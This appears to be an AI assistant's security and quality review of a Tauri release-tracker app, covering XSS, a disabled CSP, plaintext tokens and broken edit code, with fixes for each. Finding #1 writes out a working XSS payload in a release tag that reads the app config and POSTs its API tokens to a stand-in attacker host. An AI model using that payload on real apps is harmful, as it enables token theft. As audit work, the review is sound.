I have enough context to write a thorough review. Here it is.

---

# Code Review: Upstream Releases Tracker

## Summary

| Severity    | Count  |
| ----------- | ------ |
| 🔴 Critical | 6      |
| 🟠 High     | 9      |
| 🟡 Medium   | 11     |
| 🟢 Low      | 7      |
| **Total**   | **33** |

**Risk assessment**: Moderate-to-high. The combination of `csp: null`, `withGlobalTauri: true`, unescaped `innerHTML` interpolation of forge-API responses, plaintext API token storage, and a broken `host_url` validation path means a single malicious release tag could exfiltrate user tokens. Edit-flow code is broken on multiple axes (parameter name mismatches) and will silently destroy data.

**Top 3 immediate actions**:
1. Fix the broken `add_repo` parameter names in the edit flow — currently destroys repos on every "Save" (🔴 #2, 🔴 #3).
2. Stop interpolating forge-API and user data into `innerHTML`; add a CSP (🔴 #1, 🔴 #5).
3. Validate that `host_url` for Forgejo calls is what the user expects, not user-supplied — currently leaks `forgejo_token` to any host typed in the URL bar (🔴 #4).

---

## 🔴 Critical

### #1 — XSS through unsanitized forge-API data in `innerHTML`
**Location**: `frontend/app.js:50-88`

`buildCard()` interpolates `data.owner`, `data.repo_name`, `data.latest_release`, `data.system_version`, `data.host_kind`, and the raw `url` directly into a template literal that's assigned to `card.innerHTML`. The forge API controls `tag_name` (→ `latest_release`); a release tag like `"><img src=x onerror="__TAURI__.invoke('get_config').then(c=>fetch('https://attacker',{method:'POST',body:JSON.stringify(c)}))">` is enough to exfiltrate API tokens. Owner/repo strings have similar problems for any user who adds an attacker-controlled repo.

This is amplified by **#5** (`csp: null`) and **#6** (`withGlobalTauri: true`).

**Fix**: Build the card with `createElement` and `textContent`, or use a tiny escaping helper:
```js
const esc = (s) => String(s ?? "")
  .replaceAll("&", "&amp;").replaceAll("<", "&lt;")
  .replaceAll(">", "&gt;").replaceAll('"', "&quot;");
// Then interpolate ${esc(name)} etc.
```
**Effort**: ~1 hour.

---

### #2 — Edit flow uses wrong parameter names → invoke fails → repo is permanently lost
**Location**: `frontend/app.js:281-282`

```js
await invoke("delete_repo", { url: editingUrl });
await invoke("add_repo", { url: newUrl, host_url, host_kind: newHostKind });
```

The Rust command signature (`lib.rs:77`) is `add_repo(url: String, host: String, forge: ForgeKind)`. Tauri command args use camelCase (or the field name verbatim) — `host_url` and `host_kind` don't match `host` and `forge`. The `add_repo` invoke will fail with a Tauri arg deserialization error, but `delete_repo` already succeeded. **The user loses the repo every time they press Save in the edit dialog.**

**Fix**:
```js
await invoke("add_repo", { url: newUrl, host: host_url, forge: newHostKind });
```
Also wrap both calls so that a failed add restores the old entry, or re-implement edit as a single Tauri command that does delete-and-add transactionally.
**Effort**: 30 min for the fix, 1 hour to make it transactional.

---

### #3 — Edit dialog opens with `undefined` host because `data.host` doesn't exist
**Location**: `frontend/app.js:103`

```js
.addEventListener("click", () => openEditDialog(url, name, data.host));
```

`RepoData` has `host_url` and `host_kind`, not `host`. So `editingHostKind` is set to `undefined`, and `editHostSelect.value = undefined` silently fails to select any option, leaving whatever was previously displayed.

**Fix**: `openEditDialog(url, name, data.host_kind)`.
**Effort**: 5 min.

---

### #4 — Token exfiltration via attacker-chosen Forgejo host
**Location**: `src-tauri/src/git_api_handler.rs:104-110` + `frontend/app.js:159, 188-194`

The frontend extracts `host_url` from the URL bar with `new URL(url).hostname` and sends it to the backend. The backend uses it verbatim:
```rust
let api_url = format!("https://{}/api/v1/repos/{}/{}/releases/latest", host_url, owner, repo);
...
request = request.header("Authorization", format!("token {}", config.forgejo_token));
```

If the user pastes `https://evil.com/owner/repo` and picks "Forgejo", their `forgejo_token` is sent in the Authorization header to `evil.com`. No allowlist, no warning. Same trust issue with GitHub (mitigated only because GitHub uses `config.github_endpoint` from config, not the user's URL — but a malicious config edit removes that mitigation).

**Fix**: Maintain a user-managed allowlist of trusted Forgejo hosts in `Config` (e.g., `forgejo_hosts: Vec<String>`). Refuse to send the token to hosts not on the list. At minimum, warn the user before adding a repo with a new host.
**Effort**: 2-3 hours.

---

### #5 — `csp: null` disables the only XSS mitigation
**Location**: `src-tauri/tauri.conf.json:23`

With CSP disabled, an XSS payload can `fetch()` to any external server. Combined with #1 and #6, that's a full token exfiltration path.

**Fix**: Set a strict CSP:
```json
"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' ipc: https://ipc.localhost"
```
The app has no external resource needs (oat is bundled, API calls happen from the Rust backend), so `'self'`-only is achievable.
**Effort**: 1 hour to test.

---

### #6 — `withGlobalTauri: true` widens XSS blast radius
**Location**: `src-tauri/tauri.conf.json:14`

Exposing `window.__TAURI__` means any injected script can call any Tauri command — `get_config`, `delete_repo`, `add_repo`. With CSP off (#5) and XSS available (#1), this is a complete compromise.

**Fix**: Set to `false` and import IPC modules in `app.js` (it already uses `import { invoke } from "@tauri-apps/api/core"`, so the change is free).
**Effort**: 5 min plus a smoke test.

---

## 🟠 High

### #7 — `get_config` exposes plaintext tokens over IPC
**Location**: `src-tauri/src/lib.rs:31-33`

The command returns the full `Config` including all tokens. Currently the frontend doesn't call it, but any future use, plus any XSS attacker, can extract tokens via `invoke('get_config')`. Tokens are stored in `~/.config/upstream-releases-tracker/config.json` in plaintext.

**Fix**: Either remove the command (no frontend uses it), or return a redacted struct (e.g., `{has_github_key: bool, github_endpoint: String, ...}`). Long-term: migrate token storage to OS keyring via `tauri-plugin-stronghold` or `keyring-rs`.
**Effort**: 30 min to redact, ~1 day to migrate to keyring.

---

### #8 — Race condition on concurrent `refresh_repo` writes
**Location**: `src-tauri/src/lib.rs:50-74`, `src-tauri/src/app_content_handler.rs:38-46`

`refresh_repo` reads the entire `repos.json`, mutates one entry, then writes the entire file back. If two refreshes overlap (e.g., user clicks "Refresh all" while another refresh is in flight, or two API calls return at the same time during refresh-all), the second writer clobbers the first. There's no `Mutex`/`RwLock` around the file.

**Fix**: Wrap the data file behind a `tauri::State<Arc<Mutex<...>>>` (or `tokio::sync::Mutex`) and serialize all read-modify-write through it. Alternatively, add a `refresh_repos_batch` command that does N API calls in parallel and one write.
**Effort**: 2-3 hours.

---

### #9 — Root crate (`src/main.rs`) doesn't compile
**Location**: `src/main.rs:4`, `Cargo.toml`

`src/main.rs` calls `upstream_releases_tracker_lib::run()`, but the actual lib name (`src-tauri/Cargo.toml:17`) is `upstream_releases_tracker_v2_lib`. The root crate doesn't even list `src-tauri` as a dependency. `cargo build` at the workspace root will fail with an unresolved name.

This is leftover Yew scaffolding that was abandoned when the frontend moved to Vite. Confirm in CI whether `cargo build --workspace` is even green.

**Fix**: Delete the root `[package]` section, `src/main.rs`, and the WASM-only deps (`web-sys`, `js-sys`, `console_error_panic_hook`, `toml`). Keep only the `[workspace]` table.
**Effort**: 15 min.

---

### #10 — `refresh_all` is serial; N writes for N repos
**Location**: `frontend/app.js:222-227`

```js
for (const url of urls) {
  await invoke("refresh_repo", { url });
}
```

Serial network calls + N full reads and N full atomic writes of `repos.json`. For 20 repos, that's 20 sequential HTTP round-trips and 20 file writes (each pulling in the entire repo map).

**Fix**: Either `Promise.all(urls.map(...))` for parallelism, or — better — add a Tauri `refresh_all` command that fetches in parallel server-side and does a single write.
**Effort**: 1-2 hours for the backend command.

---

### #11 — No HTTP request timeout
**Location**: `src-tauri/src/git_api_handler.rs:9-15`

```rust
Client::builder().user_agent("Upstream-Release-Tracker").build()
```

No `.timeout(...)`. A slow/hung forge or DNS issue can wedge the Tokio task indefinitely. UI button stays disabled forever.

**Fix**:
```rust
Client::builder()
    .user_agent("Upstream-Release-Tracker")
    .timeout(std::time::Duration::from_secs(15))
    .connect_timeout(std::time::Duration::from_secs(5))
    .build()
```
**Effort**: 5 min.

---

### #12 — `parse_url` accepts non-HTTPS URLs and mis-parses nested paths
**Location**: `src-tauri/src/git_api_handler.rs:18-31`

```rust
let parts: Vec<&str> = url.splitn(6, '/').collect();
```

- Doesn't validate scheme — `file:///etc/passwd` would parse as `owner=etc, repo=passwd` (then fail at HTTP, but still: trust boundary violation).
- For nested-group GitLab URLs (`https://gitlab.com/group/subgroup/project`), `owner = subgroup, repo = project`, losing the parent group. This will block GitLab support entirely.
- The empty-string check on `parts[3]/parts[4]` won't catch malformed inputs like `https:///owner/repo`.

**Fix**: Use `url::Url::parse()` (already a transitive dep via `reqwest`) and inspect `path_segments()`. Reject non-`https` schemes outright.
**Effort**: 30 min.

---

### #13 — `editingHostKind` is dead state
**Location**: `frontend/app.js:3, 250-289`

`editingHostKind` is written by `openEditDialog` and reset on close, but never read between — the close handler reads `editHostSelect.value` directly. Either remove the state variable, or use it (the variable, plus storing it, is preserved if the user closes without changes — but nothing else cares).

**Fix**: Delete the `editingHostKind` declarations and assignments.
**Effort**: 5 min.

---

### #14 — `refresh_all` swallows individual failures
**Location**: `frontend/app.js:219-234`

If repo #2 of 10 fails (e.g., API rate-limited), the `for` loop throws and skips the remaining 8. The user gets a single toast for the first failure and the others are silently un-refreshed.

**Fix**: Collect successes/failures separately and report aggregate counts. If you implement the batch backend (#10), this becomes natural — return `(successes, failures)` from one call.
**Effort**: 1 hour.

---

### #15 — `ForgeKind::Unknown` is unreachable in normal flow
**Location**: `tracker_libs/src/lib.rs:8`, `git_api_handler.rs:60-63`

The frontend `<select>` only emits `GitHub`/`GitLab`/`ForgejoCompatible`. The only way `Unknown` lands in data is via direct file edit or a future bug. The error message for `Unknown` is reasonable, but the variant is technical debt — either expose it in the UI ("auto-detect") or remove it.

**Fix**: Remove the variant, or implement host-based auto-detection (`github.com` → GitHub, `gitlab.com` → GitLab, etc.) so it has a purpose.
**Effort**: 30 min to remove, 1 hour to implement detection.

---

## 🟡 Medium

### #16 — `reqwest` pulls in `blocking` feature unused
**Location**: `src-tauri/Cargo.toml:29`

`features = ["blocking", "json"]`. All call sites use `.await`. `blocking` brings in a sync runtime you don't need, increasing binary size and compile time.

**Fix**: Drop `"blocking"`. Add `"rustls-tls"` if you want to drop the OpenSSL dep (smaller bundle, fewer cross-compile issues): `features = ["json", "rustls-tls"]` with `default-features = false`.
**Effort**: 5 min + a rebuild.

---

### #17 — Atomic-rename temp path collides with file naming
**Location**: `src-tauri/src/json_handler.rs:31`

```rust
let tmp_path = path.with_extension("tmp");
```

For `repos.json`, this yields `repos.tmp` (replaces, not appends). Cleaner is `repos.json.tmp` — and prevents collision if another tool/file uses `.tmp`.

**Fix**:
```rust
let mut tmp = path.to_path_buf().into_os_string();
tmp.push(".tmp");
let tmp_path = PathBuf::from(tmp);
```
Also, on Windows, `fs::rename` fails when overwriting an existing file in some scenarios — consider `tempfile::persist` or explicit `remove_file` before rename.
**Effort**: 20 min.

---

### #18 — `upd_repo_status` reads file twice
**Location**: `src-tauri/src/app_content_handler.rs:64-85`

`upd_repo_status` calls `read_repos`, inspects an entry, then calls `upd_repo`, which itself calls `read_repos` again before writing.

**Fix**: Do the mutation inline using the map you already loaded, then call `write_to_data_file` directly:
```rust
if let Some(entry) = repos.get_mut(url) {
    entry.system_version = entry.latest_release.clone();
    Self::write_to_data_file(datafilepath, &repos)
} else { ... }
```
**Effort**: 15 min.

---

### #19 — Migrations log to `eprintln!` — invisible in GUI builds
**Location**: `src-tauri/src/migration.rs:54, 56, 60, 92, 96`

In a windowed Tauri build (`windows_subsystem = "windows"` on Windows, no terminal on macOS double-click launch), stderr goes nowhere. Migration failures are silent.

**Fix**: Use `log` + `tauri-plugin-log` (or a one-line `tracing` setup). At minimum, write migration failures to a sibling `.migration-error.log` file.
**Effort**: 1-2 hours.

---

### #20 — `btoa(url)` IDs can collide
**Location**: `frontend/app.js:33-35`

```js
const id = btoa(url).replace(/[^a-zA-Z0-9]/g, "").slice(0, 12);
```

After stripping symbols and truncating to 12 chars, two URLs sharing a prefix in base64 collide. The IDs aren't actually used in the DOM (`card.dataset.url` is what queries use), so the variable is dead weight.

**Fix**: Delete the unused `id` calculation.
**Effort**: 2 min.

---

### #21 — Hardcoded JS templates for cards (modularity)
**Location**: `frontend/app.js:50-128`

The card template, action wiring, and event handlers are all in one ~80-line block. Action handlers are re-registered per card on every `loadRepos` (no event delegation). For 100+ repos this is unnecessary work.

**Fix**: Use one delegated `click` handler on `repoGrid` that reads `data-action` and `closest('[data-url]')`. Extract the template to a function that returns a `DocumentFragment`.
**Effort**: 2 hours.

---

### #22 — Mobile responsive block duplicates rules
**Location**: `frontend/style.css:262-319`

Lines 298-318 are an exact (or near-exact) duplicate of 279-296. Dead duplicates.

**Fix**: Delete the duplicate block.
**Effort**: 5 min.

---

### #23 — No input length cap on URL field
**Location**: `frontend/app.js:157`, `src-tauri/src/lib.rs:77`

An extreme URL (50KB) gets sent through IPC and serialized into `repos.json`. Realistically not a security issue but a quality-of-life one.

**Fix**: Add `maxlength="2048"` to the inputs and reject longer in `parse_url`.
**Effort**: 5 min.

---

### #24 — `dialog` uses experimental `closedby`/`commandfor`/`command` attributes
**Location**: `frontend/index.html:50, 76-77`

`closedby="any"` requires Chrome 134+; `commandfor`/`command` require Chrome 135+. Tauri uses the platform webview — fine on modern Linux WebKitGTK and recent macOS WKWebView, but on Windows WebView2 the version depends on the user's Edge install. Older WebView2 builds will show a broken Cancel button.

**Fix**: Use `dialog.close()` from JS as a fallback:
```html
<button type="button" id="edit-cancel-btn" class="outline">Cancel</button>
```
With a JS listener that calls `editDialog.close()`.
**Effort**: 10 min.

---

### #25 — `latest_release: String::new()` on unknown tag is a silent failure
**Location**: `src-tauri/src/git_api_handler.rs:152, 178`

```rust
latest_release: json["tag_name"].as_str().unwrap_or("").to_string()
```

If the API returns a 200 with a payload missing `tag_name` (e.g., a repo with only draft releases, or an unexpected response shape), the empty string is silently stored. The card shows "—" forever.

**Fix**: Return `Err("API response missing tag_name")` instead of defaulting to "".
**Effort**: 15 min.

---

### #26 — Workspace `Cargo.toml` lacks `resolver = "2"`
**Location**: `Cargo.toml`

With edition 2024 and a workspace including `src-tauri`, you want the v2 feature resolver to avoid unifying `default-features` across native/build targets.

**Fix**:
```toml
[workspace]
resolver = "2"
members = ["src-tauri", "tracker_libs"]
```
**Effort**: 1 min.

---

## 🟢 Low

### #27 — `@tauri-apps/api` whole-package import
**Location**: `frontend/app.js:1`, `frontend/package.json:15`

Already importing only from `@tauri-apps/api/core`, but the full package is installed and shipped. Vite tree-shakes for ESM, but it's worth confirming with a bundle inspection.
**Effort**: 10 min.

### #28 — Frontend duplicates URL validation logic
**Location**: `frontend/app.js:294-298` mirrors `src-tauri/src/helper.rs` (per CLAUDE.md). Keep them in sync — note in code or implement once in Rust and expose via a `validate_repo_url` command.
**Effort**: 30 min.

### #29 — `1.125rem` literal in CSS instead of `--font-body` token
**Location**: `frontend/style.css:142`. Trivial inconsistency.
**Effort**: 1 min.

### #30 — `helper.rs` is a single-function bridge
**Location**: `src-tauri/src/helper.rs`. The whole file is one function that wraps `ConfigHandler::read_config()`. Inline it into `lib.rs` and delete the module.
**Effort**: 5 min.

### #31 — README is unchanged Tauri scaffold
**Location**: `README.md`. Says "Tauri + Yew" — the project is now Tauri + Vanilla JS. Update or remove.
**Effort**: 15 min.

### #32 — `BTreeMap` key is the URL — duplication with `RepoData.host_url + owner + repo_name`
**Location**: `tracker_libs/src/lib.rs:39-46`. The URL contains the same info as owner/repo/host_url; storing both invites drift. Acceptable as a denormalization for now, but worth a comment.
**Effort**: 5 min.

### #33 — `frontend/dist/index.html`, `dist/`, `public/repos.json` checked in / present
**Location**: Untracked: `public/repos.json` (per git status). Build artifacts under `frontend/dist/` and `dist/` are present in the working tree. Confirm `.gitignore` covers them; `public/repos.json` looks like a developer's local data file that escaped containment.
**Effort**: 5 min.

---

## Security posture overview

The app's threat model assumes the user trusts all data inside `repos.json` and all responses from forge APIs. Both assumptions break in practice — forge tag names are attacker-controllable and a `git tag '<img onerror=...>'` will be served back through `latest_release`. The defense-in-depth layers that should mitigate this (CSP, no global Tauri object, careful DOM construction) are all absent or disabled.

Token storage is the biggest residual risk after XSS is fixed: plaintext JSON in `~/.config/`. Migrating to OS keyring is the next major hardening step.

The Tauri capability surface itself is well-scoped (`core:default` + `opener:default` only), which is good — the attack surface is concentrated in the frontend.
